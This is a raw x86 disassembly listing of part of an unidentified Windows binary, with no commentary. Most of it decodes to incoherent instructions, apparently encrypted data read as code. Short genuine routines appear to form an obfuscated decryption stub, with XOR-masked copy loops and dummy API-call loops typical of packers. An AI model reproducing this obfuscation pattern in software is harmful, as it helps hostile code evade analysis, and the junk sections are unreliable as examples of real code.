  407afb:	clc    
  407afc:	pop    ebx
  407afd:	and    cl,bh
  407aff:	jmp    0xd2315b3b
  407b04:	arpl   WORD PTR [ecx+eax*8],sp
  407b07:	ret    0x55bf
  407b0a:	jae    0x407a96
  407b0c:	aad    0x5
  407b0e:	cmp    eax,0xe1d86dec
  407b13:	les    esp,FWORD PTR [eax-0x80]
  407b16:	sub    al,BYTE PTR [esi-0x2f71d044]
  407b1c:	inc    si
  407b1e:	out    0xa7,al
  407b20:	or     edx,DWORD PTR ds:0x21dac516
  407b26:	fisttp WORD PTR [esi-0x58]
  407b29:	or     al,BYTE PTR [eax-0x30]
  407b2c:	ja     0x407b90
  407b2e:	xor    al,0x37
  407b30:	xchg   edi,eax
  407b31:	xchg   esi,eax
  407b32:	jae    0x407af1
  407b34:	xchg   ebp,eax
  407b35:	daa    
  407b36:	mov    fs,ebp
  407b38:	push   esi
  407b39:	sub    dh,cl
  407b3b:	repz ret 0x847f
  407b3f:	adc    eax,esp
  407b41:	adc    eax,0xebfff6ea
  407b46:	das    
  407b47:	lock pop esp
  407b49:	mov    al,ds:0xb351feb1
  407b4e:	mov    eax,ds:0x8029fa0d
  407b53:	dec    ebx
  407b54:	pop    esi
  407b55:	call   0x95c5:0x633abdc9
  407b5c:	call   FWORD PTR [ebp+0x3e5fcc2]
  407b62:	daa    
  407b63:	data16 cmc 
  407b65:	test   BYTE PTR [ebx-0x1a],al
  407b68:	sub    eax,0x5a4fb375
  407b6d:	or     eax,0xb95ddd39
  407b72:	shl    BYTE PTR [ebp+0x22],1
  407b75:	rol    al,0x4
  407b78:	ins    DWORD PTR es:[edi],dx
  407b79:	jb     0x407b57
  407b7b:	sbb    ecx,ebx
  407b7d:	and    ebx,eax
  407b7f:	mov    esp,0xb2e5c6ac
  407b84:	ja     0x407bb4
  407b86:	daa    
  407b87:	test   BYTE PTR [esi+0x503d4177],ah
  407b8d:	dec    edx
  407b8e:	add    eax,0x103d188c
  407b93:	fcmovnb st,st(6)
  407b95:	cmp    eax,0xa0895846
  407b9a:	jo     0x407be7
  407b9c:	mov    eax,0x367a4a4
  407ba1:	jge    0x407bb3
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x96c7:0x3ffdba79
  407cce:	mov    ah,0xe9
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407c84
  407cd8:	sti    
  407cd9:	mov    ebx,0x8a03d578
  407cde:	mov    al,0x41
  407ce0:	mov    ds:0xf6318500,al
  407ce5:	ins    DWORD PTR es:[edi],dx
  407ce6:	cmp    DWORD PTR [esi-0x4a398503],edx
  407cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ced:	shl    DWORD PTR [ebp-0x588654b2],1
  407cf3:	pop    edx
  407cf4:	fidiv  WORD PTR [esi+0x26]
  407cf7:	leave  
  407cf8:	fiadd  DWORD PTR [ecx+0x7b]
  407cfb:	xchg   edi,eax
  407cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfd:	xor    DWORD PTR [eax],0xffffffa5
  407d00:	pop    ebx
  407d01:	out    dx,eax
  407d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d03:	out    dx,eax
  407d04:	sub    bh,BYTE PTR [edx+0x1de9aef]
  407d0a:	fucompp 
  407d0c:	lock xor al,0x9c
  407d0f:	out    dx,al
  407d10:	mov    cl,BYTE PTR [ebx]
  407d12:	sbb    al,0x85
  407d14:	jo     0x407cee
  407d16:	or     eax,0x1c3c6768
  407d1b:	popf   
  407d1c:	jmp    0x407cb1
  407d1e:	or     eax,0xcf2aa236
  407d23:	js     0x407d53
  407d25:	stc    
  407d26:	aas    
  407d27:	popf   
  407d28:	xchg   esi,eax
  407d29:	jns    0x407d72
  407d2b:	inc    ebx
  407d2c:	jp     0x407cdc
  407d2e:	call   0xee6e30fd
  407d33:	test   al,0xc8
  407d35:	adc    eax,0xefc7254c
  407d3a:	mov    eax,ds:0x64eb7932
  407d3f:	stos   BYTE PTR es:[edi],al
  407d40:	stos   BYTE PTR es:[edi],al
  407d41:	cmp    al,BYTE PTR [esi-0x18]
  407d44:	adc    dh,ch
  407d46:	or     ebp,0x26
  407d49:	pop    ebx
  407d4a:	not    esp
  407d4c:	daa    
  407d4d:	or     DWORD PTR [ebx-0x5c24d8b3],ebp
  407d53:	mov    dl,0xfb
  407d55:	push   esi
  407d56:	xor    BYTE PTR [ebp-0x56],cl
  407d59:	xor    al,0xf8
  407d5b:	fiadd  WORD PTR [ecx+0x6561fc56]
  407d61:	dec    edx
  407d62:	clc    
  407d63:	test   al,0x7c
  407d65:	sti    
  407d66:	jg     0x407d42
  407d68:	mov    bh,0xea
  407d6a:	jle    0x407d7b
  407d6c:	rcr    esi,0xa9
  407d6f:	fdivr  QWORD PTR [ebx+edi*2]
  407d72:	cmp    edi,DWORD PTR [ebx-0x36fe6ee3]
  407d78:	rol    BYTE PTR [ecx+esi*8+0x67226af9],cl
  407d7f:	xchg   edi,eax
  407d80:	cmp    edi,DWORD PTR [ecx]
  407d82:	psraw  mm2,QWORD PTR [eax]
  407d85:	or     al,0x90
  407d87:	test   al,0x82
  407d89:	add    bh,al
  407d8b:	mov    esi,0xb206e2e3
  407d90:	inc    edi
  407d91:	inc    DWORD PTR [edx-0x12c47ef6]
  407d97:	pusha  
  407d98:	mov    al,0xb6
  407d9a:	jnp    0x407def
  407d9c:	fistp  DWORD PTR [edi]
  407d9e:	retf   
  407d9f:	dec    ecx
  407da0:	clc    
  407da1:	fnstenv ds:0xc2e5c168
  407da7:	adc    ecx,DWORD PTR [edi]
  407da9:	jmp    0x407e00
  407dab:	inc    ecx
  407dac:	or     al,0xfb
  407dae:	add    bl,cl
  407db0:	mov    cl,0x76
  407db2:	adc    al,0xef
  407db4:	les    esp,FWORD PTR [eax+0x606effc4]
  407dba:	(bad)  
  407dbb:	dec    edi
  407dbc:	cmp    DWORD PTR [ebp-0x4275fd90],ebp
  407dc2:	dec    esi
  407dc3:	cmp    ah,bl
  407dc5:	and    DWORD PTR [eax-0x76e1119b],edi
  407dcb:	jmp    0xa3d1:0xae5cb73a
  407dd2:	out    0x81,eax
  407dd4:	push   ds
  407dd5:	(bad)  
  407dd6:	repz cmp esp,DWORD PTR [ebp+0x44]
  407dda:	or     DWORD PTR [ebx],0x71
  407ddd:	fcomi  st,st(3)
  407ddf:	dec    ebx
  407de0:	sbb    al,0x28
  407de2:	jo     0x407dca
  407de4:	and    esp,esp
  407de6:	outs   dx,BYTE PTR ds:[esi]
  407de7:	pop    ecx
  407de8:	and    al,0x98
  407dea:	adc    ebx,ebx
  407dec:	pop    es
  407ded:	or     DWORD PTR [edx+edx*8+0x6dbf5bd],edx
  407df4:	jmp    0xdf19:0x18c96337
  407dfb:	aaa    
  407dfc:	add    DWORD PTR [ebp+0x6b],ebx
  407dff:	jae    0x407e4d
  407e01:	push   ss
  407e02:	jg     0x407e61
  407e04:	jl     0x407d95
  407e06:	xchg   BYTE PTR [esi+0x50],bl
  407e09:	xor    al,0x5a
  407e0b:	jae    0x407ddc
  407e0d:	mov    eax,ds:0x543d6ed3
  407e12:	mov    ecx,0xf2f8aaaf
  407e17:	xchg   edx,eax
  407e18:	rcl    DWORD PTR ds:0x13b41684,1
  407e1e:	jg     0x407e95
  407e20:	jp     0x407e93
  407e22:	dec    esi
  407e23:	xchg   ecx,eax
  407e24:	xor    ecx,DWORD PTR [ebx]
  407e26:	mov    edx,0x92214fc7
  407e2b:	shl    ebp,cl
  407e2d:	mov    eax,ds:0xb79dcf44
  407e32:	vpmaxub xmm1,xmm4,XMMWORD PTR [esi+edx*4]
  407e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e38:	dec    edx
  407e39:	cmp    eax,esi
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [esi],esi
  407e84:	fmul   DWORD PTR [edi]
  407e86:	xchg   ebp,eax
  407e87:	dec    edi
  407e88:	adc    BYTE PTR [esi+0x7e],bh
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407eca
  407e90:	out    dx,al
  407e91:	add    eax,0x9314f514
  407e96:	dec    ebx
  407e97:	inc    edx
  407e98:	adc    ah,bh
  407e9a:	mov    esi,0xda4796b1
  407e9f:	or     esp,edi
  407ea1:	(bad)  
  407ea2:	jmp    0x407e2b
  407ea4:	mov    ds:0xaf9d554f,eax
  407ea9:	jae    0x407ec4
  407eab:	push   ecx
  407eac:	(bad)  
  407eae:	jmp    0x1e25:0x74514bc1
  407eb5:	jnp    0x407f0a
  407eb7:	adc    ebp,DWORD PTR [eax]
  407eb9:	inc    edi
  407eba:	mov    al,ds:0xdf32acb6
  407ebf:	and    DWORD PTR [ebp+ebp*1-0x30],ecx
  407ec3:	inc    edx
  407ec4:	mov    eax,ds:0xc103e0f1
  407ec9:	xor    eax,0x4e267817
  407ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ecf:	cmp    esi,eax
  407ed1:	scas   eax,DWORD PTR es:[edi]
  407ed2:	push   0xfffffffb
  407ed4:	jno    0x407e79
  407ed6:	out    dx,eax
  407ed7:	mov    ds:0x722b4453,eax
  407edc:	cmp    esp,DWORD PTR [ebx+ecx*2]
  407edf:	les    edx,FWORD PTR [eax+0x24e7f7d4]
  407ee5:	shl    al,0xd
  407ee8:	xchg   esp,eax
  407ee9:	lahf   
  407eea:	mov    ebx,0xe0b584fa
  407eef:	iret   
  407ef0:	sbb    eax,0x9658901
  407ef5:	and    al,BYTE PTR [ebp+0x1b77bd3d]
  407efb:	ss retf 0xdf04
  407eff:	pop    esi
  407f00:	int    0x1
  407f02:	popa   
  407f03:	mov    eax,ds:0x1d09e025
  407f08:	inc    esp
  407f09:	dec    esp
  407f0a:	ret    0x930e
  407f0d:	sub    eax,0x3d8b8cbf
  407f12:	into   
  407f13:	aaa    
  407f14:	bound  edx,QWORD PTR [edx]
  407f16:	fisub  WORD PTR [edi]
  407f18:	push   ebp
  407f19:	lods   al,BYTE PTR ds:[esi]
  407f1a:	shl    DWORD PTR [ebx+eax*1-0x41ad0438],0xf3
  407f22:	mov    ds:0xc567e94b,eax
  407f27:	stos   DWORD PTR es:[edi],eax
  407f28:	(bad)  [ebx]
  407f2a:	inc    ebp
  407f2b:	sbb    eax,0x5496cc02
  407f30:	xlat   BYTE PTR ds:[ebx]
  407f31:	inc    edx
  407f32:	push   esp
  407f33:	in     al,dx
  407f34:	loopne 0x407ec9
  407f36:	jp     0x407fad
  407f38:	and    ecx,esi
  407f3a:	and    eax,0x1a98cecc
  407f3f:	pop    esi
  407f40:	mov    ebx,0xe1d673c0
  407f45:	aaa    
  407f46:	or     al,0xc0
  407f48:	sbb    DWORD PTR [ebx],ecx
  407f4a:	xor    eax,0xba5ae18f
  407f4f:	(bad)  
  407f50:	inc    ecx
  407f51:	std    
  407f52:	aas    
  407f53:	retf   
  407f54:	push   0x61d04d0d
  407f59:	cdq    
  407f5a:	mov    eax,0x8910b2f6
  407f5f:	xor    eax,DWORD PTR [ecx+edx*2-0x80]
  407f63:	iret   
  407f64:	cmp    ebx,ebp
  407f66:	ds pop es
  407f68:	sbb    eax,0x1cd3ddfd
  407f6d:	enter  0x2cf3,0xc
  407f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f72:	ds jns 0x407f36
  407f75:	sub    esi,eax
  407f77:	cmp    ebp,ecx
  407f79:	jb     0x407fbe
  407f7b:	add    BYTE PTR [edx+0x23],bh
  407f7e:	jg     0x407f4a
  407f80:	sbb    DWORD PTR [edi+0x0],0x7ee19f33
  407f87:	rol    BYTE PTR [edx],0x27
  407f8a:	lahf   
  407f8b:	lea    edx,[edi]
  407f8d:	icebp  
  407f8e:	scas   al,BYTE PTR es:[edi]
  407f8f:	loope  0x407f24
  407f91:	and    ebx,DWORD PTR [edi-0x3f86f4e1]
  407f97:	and    cl,bl
  407f99:	lock jno 0x407f57
  407f9c:	loopne 0x407f69
  407f9e:	gs mov bl,0xea
  407fa1:	xor    al,ch
  407fa3:	xor    dh,BYTE PTR [eax+ecx*2+0x557205ff]
  407faa:	cmp    BYTE PTR [ecx],ah
  407fac:	neg    DWORD PTR [edx*2+0x3b567cf]
  407fb3:	(bad)  
  407fb4:	es (bad) 
  407fb6:	shl    BYTE PTR [bx-0x6daf],0xc4
  407fbc:	dec    DWORD PTR [esi-0x6fcef4ad]
  407fc2:	mov    WORD PTR [edx+0x1d80b95d],ds
  407fc8:	lahf   
  407fc9:	push   edx
  407fca:	adc    ebx,ebx
  407fcc:	jnp    0x407faa
  407fce:	ret    0x6672
  407fd1:	push   0xe38cd0a0
  407fd6:	push   ecx
  407fd7:	sbb    ebx,ebp
  407fd9:	xchg   edi,eax
  407fda:	out    dx,eax
  407fdb:	inc    ecx
  407fdc:	cmp    cl,BYTE PTR [eax+eax*4]
  407fdf:	mov    esp,0xad7e5680
  407fe4:	in     al,0x18
  407fe6:	mov    edi,0x75610f9e
  407feb:	or     al,BYTE PTR [edx]
  407fed:	(bad)  [edi+0x73]
  407ff0:	mov    esi,DWORD PTR [ebx]
  407ff2:	rol    DWORD PTR [ebx],0xc2
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	cmp    al,0x7f
  408010:	jmp    0x7e56ad94
  408015:	jle    0x407ff3
  408017:	jg     0x408097
  408019:	jle    0x407fdf
  40801b:	push   0xf7d73147
  408020:	mov    dh,0xbd
  408022:	cmp    bl,BYTE PTR [eax+0x44]
  408025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408026:	cmp    al,al
  408028:	xchg   dl,dl
  40802a:	jge    0x408044
  40802c:	mov    al,dh
  40802e:	inc    eax
  40802f:	sahf   
  408030:	dec    edx
  408031:	xchg   ebp,eax
  408032:	pop    bp
  408034:	adc    al,0xdd
  408036:	iret   
  408037:	dec    edx
  408038:	stc    
  408039:	test   BYTE PTR [esp+esi*2],bl
  40803c:	bnd jp 0x4080b5
  40803f:	cld    
  408040:	mov    ecx,DWORD PTR ds:0x58e52f90
  408046:	jae    0x4080af
  408048:	ja     0x408019
  40804a:	fdiv   QWORD PTR [eax]
  40804c:	std    
  40804d:	icebp  
  40804e:	dec    edx
  40804f:	mov    dl,0x59
  408051:	add    bl,BYTE PTR [edx]
  408053:	scas   eax,DWORD PTR es:[edi]
  408054:	test   al,0x32
  408056:	loopne 0x407ffb
  408058:	jne    0x408083
  40805a:	or     ebp,DWORD PTR [edx+0x13]
  40805d:	into   
  40805e:	dec    ebp
  40805f:	xchg   ebx,eax
  408060:	scas   eax,DWORD PTR es:[edi]
  408061:	stos   BYTE PTR es:[edi],al
  408062:	(bad)  
  408063:	test   BYTE PTR [ebp+0x354da147],0xa1
  40806a:	in     eax,0x61
  40806c:	add    eax,0x9910faca
  408071:	outs   dx,DWORD PTR ds:[esi]
  408072:	popa   
  408073:	sbb    DWORD PTR [eax-0x35],ebp
  408076:	pusha  
  408077:	mov    esp,0x7304ca91
  40807c:	mov    dl,0x0
  40807e:	pusha  
  40807f:	hlt    
  408080:	dec    eax
  408081:	fld    DWORD PTR [eax*4-0x348ad4f6]
  408088:	pop    eax
  408089:	mov    cl,0x7c
  40808b:	push   0x2fc894e9
  408090:	or     BYTE PTR [edi+0x6f],ch
  408093:	out    0x4c,al
  408095:	pop    eax
  408096:	aaa    
  408097:	mov    ecx,0x1067dd38
  40809c:	xlat   BYTE PTR ds:[ebx]
  40809d:	sub    DWORD PTR [ebp+esi*1-0x7e51796a],0x15
  4080a5:	inc    eax
  4080a6:	rol    BYTE PTR [edx-0x68],0xe
  4080aa:	daa    
  4080ab:	(bad)  
  4080ac:	lahf   
  4080ad:	xchg   ecx,eax
  4080ae:	jbe    0x408103
  4080b0:	sar    BYTE PTR [ecx],1
  4080b2:	push   ds
  4080b3:	ror    DWORD PTR [eax+edx*2-0x2f7e6f15],cl
  4080ba:	jnp    0x40812c
  4080bc:	shr    BYTE PTR [edi+edx*2],cl
  4080bf:	cmp    BYTE PTR [esi+0x20d8e4c3],cl
  4080c5:	fs aas 
  4080c7:	inc    esi
  4080c8:	push   ebp
  4080c9:	ds dec eax
  4080cb:	mov    ds:0xe25aa44,eax
  4080d0:	and    bh,BYTE PTR [ecx]
  4080d2:	jecxz  0x4080bc
  4080d4:	push   ebp
  4080d5:	jmp    0x3d68:0x7b7c968f
  4080dc:	fisubr WORD PTR [edx]
  4080de:	or     eax,0x2e2f0cdf
  4080e3:	neg    BYTE PTR [eax+0x77]
  4080e6:	cmp    ebp,ebx
  4080e8:	icebp  
  4080e9:	test   BYTE PTR [edx],dl
  4080eb:	push   0xffffff9a
  4080ed:	xor    al,0xd8
  4080ef:	jbe    0x408124
  4080f1:	shl    BYTE PTR fs:[esi+eax*8-0x59],cl
  4080f6:	pop    esi
  4080f7:	test   BYTE PTR [ebp+0x65412df2],cl
  4080fd:	leave  
  4080fe:	sub    BYTE PTR [ecx],bl
  408100:	test   eax,0x99cc2537
  408105:	sub    BYTE PTR [edx],ah
  408107:	jg     0x4080e4
  408109:	hlt    
  40810a:	jg     0x408171
  40810c:	inc    ebx
  40810d:	push   edi
  40810e:	xchg   ecx,eax
  40810f:	je     0x4080d1
  408111:	ss and eax,0x9ae18e33
  408117:	retf   
  408118:	xchg   esi,eax
  408119:	sbb    al,0xb9
  40811b:	es mov bl,0x7e
  40811e:	cmp    ebp,esi
  408120:	ds nop
  408122:	cld    
  408123:	aam    0xa5
  408125:	and    ecx,DWORD PTR [esi-0x34b2fadb]
  40812b:	and    esp,DWORD PTR [eax]
  40812d:	xchg   ecx,eax
  40812e:	xor    esp,DWORD PTR [edi+0x11]
  408131:	dec    ebx
  408132:	pop    ecx
  408133:	dec    esp
  408134:	and    al,0x1b
  408136:	inc    ecx
  408137:	mov    bl,al
  408139:	hlt    
  40813a:	aas    
  40813b:	sbb    edx,DWORD PTR [eax+0x50993f1a]
  408141:	mov    ah,0x9c
  408143:	test   BYTE PTR [edi+eax*1],dh
  408146:	push   es
  408147:	mov    bh,0x43
  408149:	xchg   esp,eax
  40814a:	and    eax,0xb7268dbd
  40814f:	cmp    edi,DWORD PTR [ebx-0x26]
  408152:	push   edx
  408153:	fisub  WORD PTR [eax+0x56fe9a87]
  408159:	out    0xe1,al
  40815b:	pop    edi
  40815c:	sub    al,0xc
  40815e:	int3   
  40815f:	jns    0x4081b5
  408161:	(bad)  
  408162:	shl    BYTE PTR [eax+0x54258724],1
  408168:	xchg   ebx,eax
  408169:	jge    0x408145
  40816b:	push   es
  40816c:	xchg   ecx,eax
  40816d:	push   es
  40816e:	pop    es
  40816f:	dec    esp
  408170:	inc    edx
  408171:	xchg   ecx,eax
  408172:	neg    BYTE PTR [ecx+0x4f50e674]
  408178:	repz call 0xc173c12a
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es push 0xffffff87
  4081a2:	sub    eax,0x7e178342
  4081a7:	jle    0x408185
  4081a9:	jg     0x408229
  4081ab:	jle    0x4081f4
  4081ad:	push   ss
  4081ae:	inc    ebx
  4081af:	stc    
  4081b0:	jne    0x4081af
  4081b2:	dec    esi
  4081b3:	bound  esp,QWORD PTR [edx-0x20]
  4081b6:	out    0x16,eax
  4081b8:	push   eax
  4081b9:	cld    
  4081ba:	aam    0x22
  4081bc:	test   DWORD PTR [edx],esp
  4081be:	mov    ah,0x6
  4081c0:	loope  0x4081c6
  4081c2:	(bad)  
  4081c3:	ins    DWORD PTR es:[edi],dx
  4081c4:	and    esi,DWORD PTR [esi]
  4081c6:	arpl   WORD PTR [ecx],dx
  4081c8:	fneni(8087 only) 
  4081ca:	fstp   TBYTE PTR [ebx+esi*1]
  4081cd:	dec    edx
  4081ce:	clc    
  4081cf:	add    BYTE PTR [eax-0x12],al
  4081d2:	mov    ebx,0x80b449a5
  4081d7:	push   esi
  4081d8:	in     eax,0x71
  4081da:	call   0x21a6:0xbecc2382
  4081e1:	cmp    BYTE PTR [edx+0x3af22e99],0x34
  4081e8:	test   DWORD PTR [esp+ecx*2-0xc],ebp
  4081ec:	test   DWORD PTR [esi-0x7a],edi
  4081ef:	fwait
  4081f0:	mov    ds:0x985af364,eax
  4081f5:	loop   0x408262
  4081f7:	xchg   esi,eax
  4081f8:	sub    eax,0x2fd05b25
  4081fd:	dec    edx
  4081fe:	repnz es loopne 0x40820e
  408202:	push   ds
  408203:	sub    edx,ecx
  408205:	dec    ebx
  408206:	push   eax
  408207:	sti    
  408208:	xor    BYTE PTR [ebx+ecx*4-0x14d0deb],ah
  40820f:	dec    ecx
  408210:	lods   al,BYTE PTR ds:[esi]
  408211:	ja     0x4081cc
  408213:	test   al,0x5e
  408215:	mov    bl,BYTE PTR [ecx+0x2ae9a8a8]
  40821b:	pop    edx
  40821c:	mov    ebp,0x812b1800
  408221:	or     al,0x5b
  408223:	jmp    0x40823f
  408225:	pop    ebp
  408226:	or     eax,0x80a35137
  40822b:	xchg   esp,eax
  40822c:	mov    DWORD PTR [ecx],eax
  40822e:	push   ebx
  40822f:	ret    0x534a
  408232:	retf   0x4ad9
  408235:	jmp    0xd205:0x60a087c5
  40823c:	test   DWORD PTR [eax+0x7f652b8f],esi
  408242:	mov    WORD PTR ds:0xf0bb24ea,ds
  408248:	sbb    bh,BYTE PTR [eax+0x12]
  40824b:	pop    edi
  40824c:	adc    eax,esi
  40824e:	test   eax,0xba03e136
  408253:	xchg   edx,eax
  408254:	sbb    ecx,DWORD PTR [edi]
  408256:	daa    
  408257:	lahf   
  408258:	mov    bh,0x45
  40825a:	out    dx,al
  40825b:	dec    edi
  40825c:	repz in al,0xe1
  40825f:	int    0x71
  408261:	mov    ds:0x69ef05fc,al
  408266:	ins    DWORD PTR es:[edi],dx
  408267:	jmp    0x7c3d:0xe60e2190
  40826e:	or     edi,DWORD PTR gs:[esi]
  408271:	pop    ebx
  408272:	mov    esp,DWORD PTR [edi+ecx*4-0x2]
  408276:	in     eax,0x6c
  408278:	and    bh,BYTE PTR [ebx-0x1e]
  40827b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40827c:	jo     0x408293
  40827e:	sbb    al,0x65
  408280:	sub    edx,DWORD PTR [edi-0xff8f29a]
  408286:	aaa    
  408287:	mov    bl,0x43
  408289:	mov    eax,0x8d7dac1d
  40828e:	mov    ah,0x74
  408290:	sbb    BYTE PTR [edx-0x5b],ah
  408293:	pop    edi
  408294:	jns    0x4082e5
  408296:	xchg   esp,eax
  408297:	dec    edx
  408298:	inc    edi
  408299:	jp     0x408222
  40829b:	push   ebx
  40829c:	dec    ebx
  40829d:	stos   DWORD PTR es:[edi],eax
  40829e:	daa    
  40829f:	adc    ebx,eax
  4082a1:	or     DWORD PTR [ecx],0xab06e5fd
  4082a7:	test   BYTE PTR [ebx+0xf],0x22
  4082ab:	std    
  4082ac:	nop
  4082ad:	mov    DWORD PTR [ecx],ecx
  4082af:	pop    edx
  4082b0:	mov    DWORD PTR [edx+esi*1-0x39],0x32a92d94
  4082b8:	mov    al,0x5f
  4082ba:	mov    BYTE PTR [ebp+0x235c2b5d],cl
  4082c0:	shr    edi,cl
  4082c2:	adc    bh,0xdc
  4082c5:	das    
  4082c6:	push   ss
  4082c7:	xor    al,0x27
  4082c9:	aas    
  4082ca:	jns    0x408314
  4082cc:	dec    ebx
  4082cd:	dec    DWORD PTR [esp+ebp*2]
  4082d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d1:	add    eax,0xab13c4e2
  4082d6:	mov    esi,0x2c5d987e
  4082db:	inc    esp
  4082dc:	sbb    eax,0xf36e1bdc
  4082e1:	jge    0x4082ef
  4082e3:	pop    ds
  4082e4:	and    eax,0x1b93cf8
  4082e9:	test   BYTE PTR [ebp-0x4b],cl
  4082ec:	dec    esi
  4082ed:	cs mov ebp,0x1c5b116c
  4082f3:	pusha  
  4082f4:	pop    esi
  4082f5:	iret   
  4082f6:	dec    ebx
  4082f7:	pop    eax
  4082f8:	mov    ds:0x64efe2b7,al
  4082fd:	pop    ds
  4082fe:	aam    0xfe
  408300:	retw   0x125e
  408304:	shl    BYTE PTR [edi+0x21],cl
  408307:	lahf   
  408308:	in     al,dx
  408309:	xchg   esp,eax
  40830a:	mov    cl,0xf0
  40830c:	shr    DWORD PTR [esi-0x5d],1
  40830f:	dec    esp
  408310:	(bad)  
  408311:	inc    eax
  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
